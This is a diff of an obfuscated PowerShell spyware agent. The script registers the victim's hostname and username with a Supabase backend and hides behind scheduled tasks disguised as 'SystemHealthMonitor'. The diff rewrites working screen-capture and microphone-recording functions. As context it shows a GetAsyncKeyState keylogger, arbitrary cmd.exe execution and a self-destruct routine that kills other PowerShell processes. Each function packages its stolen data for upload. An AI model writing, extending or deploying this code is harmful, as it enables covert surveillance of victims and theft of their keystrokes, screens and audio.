@@ -10,10 +10,51 @@ ${_dn}=-join((65..90)+(97..122)|Get-Random -Count 8|%{[char]$_})
 ${_h}=@{"apikey"=${_cfg}.supabase_key;"Authorization"="Bearer $(${_cfg}.supabase_key)";"Content-Type"="application/json";"Prefer"="return=minimal"}
 function Invoke-0x8F3{param($ep,$mt="GET",$bd=$null);${_u}="$(${_cfg}.supabase_url)/rest/v1/$ep";try{if($bd){Invoke-RestMethod -Uri ${_u} -Method $mt -Headers ${_h} -Body ($bd|ConvertTo-Json -Depth 10 -Compress) -TimeoutSec 30}else{Invoke-RestMethod -Uri ${_u} -Method $mt -Headers ${_h} -TimeoutSec 30}}catch{$null}}
 ${_rd}=@{device_id=${_did};device_name=${_dn};hostname=$env:COMPUTERNAME;username=$env:USERNAME;os_info=(Get-CimInstance Win32_OperatingSystem).Caption};Invoke-0x8F3 -ep "devices" -mt "POST" -bd ${_rd}
-function Get-0xA1B{try{Add-Type -AssemblyName System.Windows.Forms,System.Drawing;${_s}=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;${_b}=New-Object System.Drawing.Bitmap(${_s}.Width,${_s}.Height);${_g}=[System.Drawing.Graphics]::FromImage(${_b});${_g}.CopyFromScreen(${_s}.Location,[System.Drawing.Point]::Empty,${_s}.Size);${_ms}=New-Object System.IO.MemoryStream;${_b}.Save(${_ms},[System.Drawing.Imaging.ImageFormat]::Png);${_g}.Dispose();${_b}.Dispose();${_r}=[Convert]::ToBase64String(${_ms}.ToArray());${_ms}.Dispose();return @{data_type="display";file_data=${_r}}}catch{return @{data_type="display";data="Failed: $_"}}}
+
+function Get-0xA1B{
+try{
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+${_s}=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+${_b}=New-Object System.Drawing.Bitmap(${_s}.Width,${_s}.Height)
+${_g}=[System.Drawing.Graphics]::FromImage(${_b})
+${_g}.CopyFromScreen(${_s}.Location,[System.Drawing.Point]::Empty,${_s}.Size)
+${_ms}=New-Object System.IO.MemoryStream
+${_b}.Save(${_ms},[System.Drawing.Imaging.ImageFormat]::Png)
+${_g}.Dispose();${_b}.Dispose()
+${_r}=[Convert]::ToBase64String(${_ms}.ToArray())
+${_ms}.Dispose()
+return @{data_type="display";file_data=${_r}}
+}catch{return @{data_type="display";data="Failed: $_"}}
+}
+
 function Get-0xC3D{param($dur=60);try{Add-Type -AssemblyName System.Windows.Forms;Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);' -Name K0x1 -Namespace U0x1 -EA SilentlyContinue;${_kb}=New-Object System.Text.StringBuilder;${_st}=Get-Date;${_et}=${_st}.AddSeconds($dur);while((Get-Date) -lt ${_et}){try{for(${_vk}=8;${_vk} -le 190;${_vk}++){${_ks}=[U0x1.K0x1]::GetAsyncKeyState(${_vk});if(${_ks} -eq -32767){${_kn}=[System.Windows.Forms.Keys]${_vk};[void]${_kb}.Append("${_kn} ")}};Start-Sleep -Milliseconds 50}catch{break}};${_d}=${_kb}.ToString();if(${_d} -and ${_d}.Trim()){return @{data_type="input";data=${_d}}}else{return @{data_type="input";data="[No keystrokes recorded]"}}}catch{return @{data_type="input";data="Error: $_"}}}
 function Get-0xD4E{try{${_os}=Get-CimInstance Win32_OperatingSystem;${_cs}=Get-CimInstance Win32_ComputerSystem;${_p}=Get-CimInstance Win32_Processor;${_i}=@{OS=${_os}.Caption;Version=${_os}.Version;Arch=${_os}.OSArchitecture;Hostname=$env:COMPUTERNAME;User=$env:USERNAME;Domain=$env:USERDOMAIN;CPU=${_p}.Name;RAM="$([math]::Round(${_cs}.TotalPhysicalMemory/1GB,2)) GB";LastBoot=${_os}.LastBootUpTime.ToString();Uptime=((Get-Date)-${_os}.LastBootUpTime).ToString("dd\.hh\:mm\:ss")};return @{data_type="sysinfo";data=(${_i}|ConvertTo-Json -Compress)}}catch{return @{data_type="error";data=$_.Exception.Message}}}
-function Get-0xE5F{param($dur=10);try{Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class A0x1{[DllImport("winmm.dll")]public static extern int mciSendString(string c,System.Text.StringBuilder r,int l,IntPtr h);}';${_f}=[System.IO.Path]::GetTempFileName() -replace '\.tmp$','.wav';[A0x1]::mciSendString("open new type waveaudio alias r0x",$null,0,0);[A0x1]::mciSendString("record r0x",$null,0,0);Start-Sleep $dur;[A0x1]::mciSendString("stop r0x",$null,0,0);[A0x1]::mciSendString("save r0x `"${_f}`"",$null,0,0);[A0x1]::mciSendString("close r0x",$null,0,0);if(Test-Path ${_f}){${_b}=[Convert]::ToBase64String([IO.File]::ReadAllBytes(${_f}));Remove-Item ${_f} -Force;return @{data_type="audio";file_data=${_b}}};return @{data_type="error";data="Recording failed"}}catch{return @{data_type="error";data=$_.Exception.Message}}}
+
+function Get-0xE5F{
+param($dur=10)
+try{
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+using System.Text;
+public class A0x1{
+[DllImport("winmm.dll")]
+public static extern int mciSendString(string c,StringBuilder r,int l,IntPtr h);
+}
+"@
+${_f}=[System.IO.Path]::GetTempFileName() -replace '\.tmp$','.wav'
+[A0x1]::mciSendString("open new type waveaudio alias r0x",$null,0,0)
+[A0x1]::mciSendString("record r0x",$null,0,0)
+Start-Sleep $dur
+[A0x1]::mciSendString("stop r0x",$null,0,0)
+[A0x1]::mciSendString("save r0x `"${_f}`"",$null,0,0)
+[A0x1]::mciSendString("close r0x",$null,0,0)
+if(Test-Path ${_f}){${_b}=[Convert]::ToBase64String([IO.File]::ReadAllBytes(${_f}));Remove-Item ${_f} -Force;return @{data_type="audio";file_data=${_b}}}
+return @{data_type="error";data="Recording failed"}
+}catch{return @{data_type="error";data=$_.Exception.Message}}
+}
+
 function Invoke-0xF6G{param($c);try{${_o}=& cmd.exe /c $c 2>&1;return @{data_type="cmd_result";data=(@{command=$c;output=${_o};exit_code=$LASTEXITCODE;executed_as="USER"}|ConvertTo-Json -Compress)}}catch{return @{data_type="cmd_result";data=(@{command=$c;error=$_.Exception.Message}|ConvertTo-Json -Compress)}}}
 function Remove-0xG7H{try{Unregister-ScheduledTask -TaskName "SystemHealthMonitor" -Confirm:$false -EA SilentlyContinue;Unregister-ScheduledTask -TaskName "SystemHealthAdmin" -Confirm:$false -EA SilentlyContinue;Get-Process -Name "powershell" -EA SilentlyContinue|Where-Object{$_.Id -ne $PID}|Stop-Process -Force -EA SilentlyContinue;Start-Sleep 2;Remove-Item ${_bp} -Recurse -Force -EA SilentlyContinue;return @{data_type="sysinfo";data="Agent destroyed"}}catch{return @{data_type="error";data=$_.Exception.Message}}}
 ${_si}=if(${_cfg}.sync_interval){${_cfg}.sync_interval}else{10};${_ri}=if(${_cfg}.retry_interval){${_cfg}.retry_interval}else{10};${_lt}=Get-Date;${_tt}=@("screenshot","input_monitor","system_info","voice_capture","cmd_exec","auto_destruct","restart_agent")
